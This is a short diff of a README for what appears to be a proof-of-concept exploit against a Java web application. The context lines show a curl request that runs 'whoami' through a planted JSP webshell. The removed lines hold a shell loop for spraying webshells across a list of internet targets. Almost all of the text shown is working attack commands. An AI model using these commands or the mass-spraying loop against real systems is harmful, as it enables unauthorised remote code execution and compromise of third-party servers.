@@ -20,10 +20,6 @@ I hadn't seen this method posted anywhere, just wanted to document. 99% of this 
 4. But we're using cURL, so now issue the second cURL request:  
 `curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -`. 
 
-Bonus: I guess you could do something like the following to blindly spray webshells across the internet. Not recommended:  
-
-`for i in $(cat targets.txt); do curl --config request.txt $i:$/yougottafixurethisout; done`. IYKYK. 
-
 
    
 ![image](https://user-images.githubusercontent.com/13237617/161151879-3cf326ad-6610-4bfe-992d-1d03279e6da5.png)
